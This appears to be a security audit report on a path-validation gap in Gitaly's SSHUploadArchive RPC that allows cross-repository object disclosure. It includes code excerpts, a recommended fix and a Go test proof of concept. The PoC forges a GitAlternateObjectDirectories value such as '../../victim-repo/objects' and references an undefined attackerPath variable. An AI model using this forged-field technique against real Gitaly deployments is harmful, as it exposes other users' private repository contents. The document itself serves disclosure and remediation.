### Title
Unvalidated `GitObjectDirectory`/`GitAlternateObjectDirectories` fields allow cross-repository object disclosure via `SSHUploadArchive` - (File: `internal/gitaly/service/ssh/upload_archive.go`)

### Summary
`validateFirstUploadArchiveRequest` only calls `locator.ValidateRepository` on the top-level `StorageName`/`RelativePath` of the request's `Repository` message, never checking `GitObjectDirectory` or `GitAlternateObjectDirectories`. These attacker-supplied fields flow unmodified into `alternates.Env()` when the `git-upload-archive` command is spawned, letting an attacker who controls their own repository's request fields point `GIT_ALTERNATE_OBJECT_DIRECTORIES` at another repository's object store.

### Finding Description
`SSHUploadArchive` validates the request with:
```go
func validateFirstUploadArchiveRequest(ctx context.Context, locator storage.Locator, req *gitalypb.SSHUploadArchiveRequest) error {
	if err := locator.ValidateRepository(ctx, req.GetRepository()); err != nil {
``` [1](#0-0) 

`configLocator.ValidateRepository` only inspects `GetStorageName()`/`GetRelativePath()` and never touches `GetGitObjectDirectory()`/`GetGitAlternateObjectDirectories()`: [2](#0-1) 

`sshUploadArchive` then builds the repo and runs `git-upload-archive` via `s.runUploadCommand`, using `req.GetRepository()` (including the unvalidated alternates fields) directly: [3](#0-2) 

Inside `gitcmd.ExecCommandFactory.newCommand`, the repo path is resolved (which again only validates `StorageName`/`RelativePath` via `GetRepoPath`) and then the raw fields are passed to `alternates.Env`:
```go
repoPath, err = cf.locator.GetRepoPath(ctx, repo)
...
env = append(alternates.Env(repoPath, repo.GetGitObjectDirectory(), repo.GetGitAlternateObjectDirectories()), env...)
``` [4](#0-3) 

`alternates.Env` performs no path containment check at all — it simply joins the attacker-controlled relative directory onto `repoPath`:
```go
for _, dir := range alternateObjectDirectories {
    dirsList = append(dirsList, filepath.Join(repoPath, dir))
}
env = append(env, fmt.Sprintf("GIT_ALTERNATE_OBJECT_DIRECTORIES=%s", strings.Join(dirsList, ":")))
``` [5](#0-4) 

This is in stark contrast to `localrepo.Repo.ObjectDirectoryPath()`, which is used by some other RPCs (e.g. `GetObjectDirectorySize`) and does enforce `storage.ValidateRelativePath` plus quarantine-prefix checks before trusting `GitObjectDirectory`: [6](#0-5) 

That validation is not invoked anywhere on the `newCommand`/`alternates.Env` path, so any RPC that runs a git command against `req.GetRepository()` — including `SSHUploadArchive` — inherits this gap. Given the attacker fully controls `StorageName`/`RelativePath` (their own repo) and the `GitAlternateObjectDirectories` list (e.g. `"../../victim-repo/objects"`), `filepath.Join(repoPath, dir)` resolves to a directory outside the attacker's own repository, and Git will use it as an alternate object source for `git-upload-archive`.

### Impact Explanation
If exploited, `git-upload-archive` run against the attacker's own repository will be able to resolve and archive any object (blob/tree/commit) reachable from a known OID sitting in the victim's `objects` directory (added as an alternate), even though the attacker has no access grant to that repository. This is cross-repository object disclosure — the exact "repository isolation" bypass the audit targets, matching GitLab's bounty class for cross-tenant/cross-project data disclosure via Gitaly's alternates mechanism.

### Likelihood Explanation
The exploit requires only that the attacker (1) owns some repository (any GitLab user with a project) and (2) can submit or control the `Repository` proto fields of an `SSHUploadArchiveRequest` — no privileged role, secret, or peer compromise is needed per the stated threat model. The remaining requirement — knowing an object ID (OID) that exists in the target repository — is a real-world constraint (the attacker needs a specific commit/tree/blob hash), but many commit SHAs are discoverable (e.g., leaked in CI logs, merge request pages, git notifications, or exposed via other information disclosure). The repeatability is high: the same forged field works on every `SSHUploadArchive` call, and the underlying gap (no validation of `GitObjectDirectory`/`GitAlternateObjectDirectories` on the generic git-command spawning path) likely also affects any other RPC path that similarly builds commands directly from a client-supplied `Repository` message without going through `ObjectDirectoryPath`-style validation.

### Recommendation
Validate `GitObjectDirectory` and `GitAlternateObjectDirectories` the same way `localrepo.Repo.ObjectDirectoryPath()` does (relative-path containment within the repository/storage, or matching an expected quarantine-directory prefix) before they are used to build `GIT_OBJECT_DIRECTORY`/`GIT_ALTERNATE_OBJECT_DIRECTORIES` in `gitcmd.ExecCommandFactory.newCommand`/`alternates.Env`. At minimum, reject repository messages where these fields are set but do not correspond to a quarantine directory that Gitaly itself created for that request (rather than trusting attacker-set values verbatim), and apply this check centrally in `newCommand` rather than only in isolated RPCs like `GetObjectDirectorySize`.

### Proof of Concept
```go
func TestSSHUploadArchive_crossRepoAlternateDisclosure(t *testing.T) {
    ctx := testhelper.Context(t)
    cfg := testcfg.Build(t)
    client, socket := runSSHServer(t, cfg) // existing ssh test server setup

    // Victim repo with a secret blob only it can see.
    victimRepo, victimPath := gittest.CreateRepository(t, ctx, cfg, gittest.CreateRepositoryConfig{SkipCreationViaService: true})
    secretBlobOID := gittest.WriteBlob(t, cfg, victimPath, []byte("victim secret"))
    secretCommit := gittest.WriteCommit(t, cfg, victimPath, gittest.WithTreeEntries(
        gittest.TreeEntry{Path: "secret.txt", Mode: "100644", OID: secretBlobOID},
    ))

    // Attacker-owned repo, no relation to victimRepo.
    attackerRepo, _ := gittest.CreateRepository(t, ctx, cfg, gittest.CreateRepositoryConfig{SkipCreationViaService: true})

    // Compute a relative path from attackerRepo to victimRepo's objects dir.
    relAlt, err := filepath.Rel(attackerPath, filepath.Join(victimPath, "objects"))
    require.NoError(t, err)

    forgedRepo := proto.Clone(attackerRepo).(*gitalypb.Repository)
    forgedRepo.GitAlternateObjectDirectories = []string{relAlt}

    stream, err := client.SSHUploadArchive(ctx)
    require.NoError(t, err)
    require.NoError(t, stream.Send(&gitalypb.SSHUploadArchiveRequest{Repository: forgedRepo}))

    // Send pktline args requesting an archive of the victim's commit, known to the attacker.
    require.NoError(t, stream.Send(&gitalypb.SSHUploadArchiveRequest{
        Stdin: pktline.PktArg(string(secretCommit)),
    }))
    require.NoError(t, stream.Send(&gitalypb.SSHUploadArchiveRequest{Stdin: pktline.PktFlush()}))
    require.NoError(t, stream.CloseSend())

    var stdout bytes.Buffer
    for {
        resp, err := stream.Recv()
        if err == io.EOF { break }
        require.NoError(t, err)
        stdout.Write(resp.GetStdout())
    }

    // Assert that the archive produced from the attacker's repo actually
    // contains the victim's secret blob content, proving cross-repo disclosure.
    require.Contains(t, stdout.String(), "victim secret")
}
```
Expected result on the vulnerable code: the assertion passes, demonstrating that the archive built from `attackerRepo` contains objects only present in `victimRepo`.

func (l *configLocator) ValidateRepository(ctx context.Context, repo storage.Repository, opts ...storage.ValidateRepositoryOption) error {
	var cfg storage.ValidateRepositoryConfig
	for _, opt := range opts {
		opt(&cfg)
	}

	// Only checking for `nil` isn't sufficient as Protobuf messages may be non-nil, but still
	// either invalid or empty. Thus we also explicitly verify whether both the storage name and
	// the relative path are unset.
	if repo == nil || repo.GetStorageName() == "" && repo.GetRelativePath() == "" {
		return structerr.NewInvalidArgument("%w", storage.ErrRepositoryNotSet)
	}

	relativePath := repo.GetRelativePath()
	if len(relativePath) == 0 {
		return structerr.NewInvalidArgument("%w", storage.ErrRepositoryPathNotSet)
	}
